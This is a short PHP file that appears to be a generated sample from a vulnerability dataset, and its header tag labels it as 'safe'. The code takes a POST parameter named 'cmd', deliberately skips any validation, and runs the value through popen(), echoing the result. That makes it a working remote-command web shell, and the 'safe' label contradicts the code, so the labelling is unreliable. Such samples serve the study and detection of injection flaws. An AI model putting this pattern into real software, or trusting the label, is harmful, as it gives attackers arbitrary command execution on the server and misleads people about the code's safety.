<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY_ISSET; SKELETON=S2; KEY=cmd; SINK=B6; VAR=v0117 */
function SINK_B6($command){
    $handle = popen($command, "r");
            $output = '';
            while (!feof($handle)) {
                $output .= fgets($handle);
            }
            pclose($handle);
            echo $output;
}
$p = $_POST;
$inp = isset($p["cmd"]) ? (string)$p["cmd"] : "";
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B6($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
